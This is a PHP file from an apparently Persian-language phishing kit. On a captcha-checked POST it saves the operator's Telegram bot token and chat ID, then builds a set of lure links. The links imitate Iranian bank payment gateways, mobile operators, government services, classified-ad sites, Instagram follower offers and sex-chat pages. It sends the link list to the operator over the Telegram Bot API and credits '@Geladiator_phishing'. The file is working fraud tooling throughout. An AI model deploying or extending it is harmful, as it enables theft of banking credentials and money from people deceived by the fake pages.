<?php
include"INFO.php";
//ANTY SPAME
if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}

$Code=$_POST["code"];
$cheack = file_get_contents("captcha/code.txt");
 if ($Code==$cheack){
$T=file_get_contents("captcha/token.txt");
$IDS2=file_get_contents("captcha/id.txt");





file_put_contents("ID.txt",$IDS2);
 
$IP=$_SERVER["REMOTE_ADDR"];
$Domain=$_SERVER["HTTP_HOST"];
$O=rand(1000,9000);
if(!file_exists("data")){mkdir("data");}
$xkiler = fopen("data/$O.php", 'w') or die("Kos Nanat!");
fwrite($xkiler, "<?php\n");
fwrite($xkiler, "$");
fwrite($xkiler, "TOKEN='$T';\n");
fwrite($xkiler, "$");
fwrite($xkiler, "ID= $IDS2;\n");
fwrite($xkiler, "?>");


$Asan="$url/Asan/?e=$O";
$Live="$url/Live/?e=$O";
$Sighe="$url/Sighe/?e=$O";
$Irancell="$url/Irancell/?e=$O";
$Dostyabi="$url/Dostyabi/?e=$O";
$Masaj="$url/Masaj/?e=$O"; 
$Mobo="$url/Mobo/?e=$O";
$Charge="$url/Charge/?e=$O" ;
$Vam="$url/Vam/?e=$O";
$Mci="$url/Mci/?e=$O" ;
$Chat="$url/Chat/?e=$O";
$net6="$url/Net/?e=$O";
$Internet="$url/Internet/?e=$O" ;
$Hamta="$url/Hamta/?e=$O" ;
$Kheyrieh="$url/Kheyrieh/?e=$O" ;
$Internetmeli="$url/Internetmeli/?e=$O" ;
$Saham="$url/Saham/?e=$O" ;
$Freefolower="$url/Freefolower/?e=$O";
$Mellat= "$url/Mellat/?e=$O" ;
$Folower="$url/Folower/?e=$O";
$Filimo="$url/Filimo/?e=$O";
$Divar="$url/Divar/?e=$O" ;
$sheypoor="$url/sheypoor/?e=$O" ;
$book="$url/book/?e=$O" ;


        $Text="
        
        ╔═ [𝚈𝚘𝚞𝚛 𝚕𝚒𝚗𝚔𝚜!] ════╣⫸
╟ ✳️ Name :  Asan (آسان پرداخت) 
║ $Asan
╠═══════════════╣⫸
╟ ✳️ Name : Mellat (به پرداخت)
║ $Mellat
╠═══════════════╣⫸
╟ ✳️ Name :Charge(شارژ جدید)
║ $Charge
╠═══════════════╣⫸
╟ ✳️ Name : Net ( نت )
║ $net6
╠═══════════════╣⫸
╟ ✳️ Name : Vam (وام یک ملیونی)
║ $Vam
╠═══════════════╣⫸
╟ ✳️ Name : Mci (ام سی ای)
║ $Mci
╠═══════════════╣⫸
╟ ✳️ Name : Sex Chat(سکس چت)
║ $Chat
╠═══════════════╣⫸
╟ ✳️ Name : Live sexi (لایو سکسی)
║ $Live
╠═══════════════╣⫸
╟ ✳️ Name : Sighe (صیغه)
║ $Sighe
╠═══════════════╣⫸
╟ ✳️ Name : Iranccel (نت ایرانسل)
║ $Irancell
╠═══════════════╣⫸
╟ ✳️ Name : Netnew (نت جدید ) 
║ $Internet
╠═══════════════╣⫸
╟ ✳️ Name : Mobo (موبوشارژ) 
║ $Mobo
╠═══════════════╣⫸
╟ ✳️ Name : Help (کمک به بیماران) 
║ $Kheyrieh
╠═══════════════╣⫸
╟ ✳️ Name : Hamta (سامانه همتا) 
║ $Hamta
╠═══════════════╣⫸
╟ ✳️ Name : Netmeli (اینترنت ملی) 
║ $Internetmeli
╠═══════════════╣⫸
╟ ✳️ Name : Saham (سهام عدالت) 
║ $Saham
╠═══════════════╣⫸
╟ ✳️ Name : Folower ( خرید فالور) 
║ $Folower
╠═══════════════╣⫸
╟ ✳️ Name : Folower ( خرید اشتراک فیلمو) 
║ $Filimo
╠═══════════════╣⫸
╟ ✳️ Name : Divar  ( دیوار ) 
║ $Divar
╠═══════════════╣⫸
╟ ✳️ Name : Insta (فیک پیچ ) 
║ $Freefolower
╠═══════════════╣⫸
╟ ✳️ Name : Masaj (رزو ماساژور)
║ $Masaj
║
╠═══════════════╣⫸
╟ ✳️ Name : sheypoor (شیپور)
║ $sheypoor
║
╠═══════════════╣⫸
╟ ✳️ Name : book (کتاب)
║ $book
║
╠[𝚈𝚘𝚞𝚛 𝙸𝙿]╣⫸
╟ 🌐𝙸𝙿 <code>$IP</code>
╠═══[𝙻𝚒𝚗𝚔]══╣⫸
╟ ♻️ WEB LINK
║ $url
╠══[𝙿𝚘𝚛𝚝]═══╣⫸
╟ 🔢YOR  CODE <code>$O</code>
║ 
╠════════[𝙲𝚛𝚎𝚊𝚝𝚘𝚛] ════╣⫸
╟ ✨Cʀᴇᴀᴛᴇᴅ Bʏ : @Geladiator_phishing
║                @phishing_bax
║ 
╠═══[𝙲𝚑𝚊𝚗𝚗𝚎𝚕𝚝𝚎𝚕]═══════╣⫸
╟ 🆔 @Geladiator_phishing
║     @phishing_bax
║ 
╚══════  [𝙶𝚘𝚘𝚍 𝚕𝚞𝚌𝚔!] ════╣⫸
";
        

        $report =  file_get_contents("https://api.telegram.org/bot".$T."/SendMessage?chat_id=".$IDS2."&disable_web_page_preview=true&parse_mode=HTML&text=".urlencode($Text));

$chat= file_get_contents("ID.txt");
$yo="your chat id: " ;
}else{echo "error";};
	?>
 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <title>Registration Successful Message Example</title>

    <meta name="author" content="Codeconvey" />
    <!-- Message Box CSS -->
    <link rel="stylesheet" href="css/style.css">
    <!--Only for demo purpose - no need to add.-->
    <link rel="stylesheet" href="css/demo.css" />
	
</head>
<body>
              
<!-- partial:index.partial.html -->
<div id='card' class="animated fadeIn">
  <div id='upper-side'>
    <?xml version="1.0" encoding="utf-8"?>
      <!-- Generator: Adobe Illustrator 17.1.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
      <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
      <svg version="1.1" id="checkmark" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" xml:space="preserve">
        <path d="M131.583,92.152l-0.026-0.041c-0.713-1.118-2.197-1.447-3.316-0.734l-31.782,20.257l-4.74-12.65
	c-0.483-1.29-1.882-1.958-3.124-1.493l-0.045,0.017c-1.242,0.465-1.857,1.888-1.374,3.178l5.763,15.382
	c0.131,0.351,0.334,0.65,0.579,0.898c0.028,0.029,0.06,0.052,0.089,0.08c0.08,0.073,0.159,0.147,0.246,0.209
	c0.071,0.051,0.147,0.091,0.222,0.133c0.058,0.033,0.115,0.069,0.175,0.097c0.081,0.037,0.165,0.063,0.249,0.091
	c0.065,0.022,0.128,0.047,0.195,0.063c0.079,0.019,0.159,0.026,0.239,0.037c0.074,0.01,0.147,0.024,0.221,0.027
	c0.097,0.004,0.194-0.006,0.292-0.014c0.055-0.005,0.109-0.003,0.163-0.012c0.323-0.048,0.641-0.16,0.933-0.346l34.305-21.865
	C131.967,94.755,132.296,93.271,131.583,92.152z" />
        <circle fill="none" stroke="#ffffff" stroke-width="5" stroke-miterlimit="10" cx="109.486" cy="104.353" r="32.53" />
      </svg>
      <h3 id='status'>
      Success
    </h3>
  </div>
  <div id='lower-side'>
    <p id='message'>
      Congratulations, your account has been successfully created.
    </p>
    <a href="#" id="contBtn">Continue</a>
  </div>
</div>
<!-- partial -->
    		
           
    		</div>
		</div>
    </div>
</section>
     


    <!-- Analytics -->

	</body>
</html>
